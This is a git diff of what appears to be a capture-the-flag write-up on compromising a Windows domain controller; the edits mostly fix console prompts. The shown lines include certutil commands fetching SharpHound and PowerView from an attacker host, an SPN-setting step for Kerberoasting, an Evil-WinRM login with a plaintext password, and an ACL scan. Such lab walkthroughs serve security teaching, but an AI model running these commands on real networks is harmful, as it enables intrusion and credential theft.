@@ -180,9 +180,6 @@ On the machine we see two additional users (`RSA_4810` and `SSA_6010`).
 
 ```console
 C:\Users>dir
-dir
- Volume in drive C has no label.
- Volume Serial Number is 9756-87FD
 
  Directory of C:\Users
 
@@ -200,7 +197,7 @@ Since this is a domain controller and we are a domain user, we can run SharpHoun
 
 ```console
 C:\Users\NU_1055> certutil -f -urlcache http://10.10.14.4:8888/SharpHound.exe %TEMP%\SharpHound.exe
-PS C:\Users\NU_1055> %temp%\SharpHound.exe -c All --zipfilename "Bloodhound.zip"
+C:\Users\NU_1055> %temp%\SharpHound.exe -c All --zipfilename "Bloodhound.zip"
 ```
 
 We wait for the SharpHound tool to finish and then transfer the ZIP file to our machine.
@@ -216,8 +213,7 @@ It might be necessary to extract the json files from the ZIP file and converting
 
 We can copy PowerView onto the host and perform the attack from Windows.
 ```console
-C:\Users\NU_1055> certutil -f -urlcache http://10.10.14.4:8888/PowerView.ps1 PowerView.ps1
-C:\Users\NU_1055> powershell
+PS C:\Users\NU_1055> certutil -f -urlcache http://10.10.14.4:8888/PowerView.ps1 PowerView.ps1
 PS C:\Users\NU_1055> . .\PowerView.ps1
 
 PS C:\Users\NU_1055> Set-DomainObject -Identity 'RSA_4810' -Set @{serviceprincipalname='nonexistent/BLEED'}
@@ -243,7 +239,7 @@ We can now login with Evil-WinRM and we look for ACLs that can be abused.
 $ evil-winrm -i 10.10.11.22 -u 'RSA_4810' -p '(Ni7856Do9854Ki05Ng0005 #)'
 
 *Evil-WinRM* PS C:\Users\RSA_4810\Documents> upload PowerView.ps1
-*Evil-WinRM* PS C:\Users\RSA_4810\Documents>  . .\PowerView.ps1
+*Evil-WinRM* PS C:\Users\RSA_4810\Documents> . .\PowerView.ps1
 *Evil-WinRM* PS C:\Users\RSA_4810\Documents> Invoke-ACLScanner -ResolveGUIDs | select IdentityReferenceName, ObjectDN, ObjectAceType, ActiveDirectoryRights | fl
 
 <SNIP>
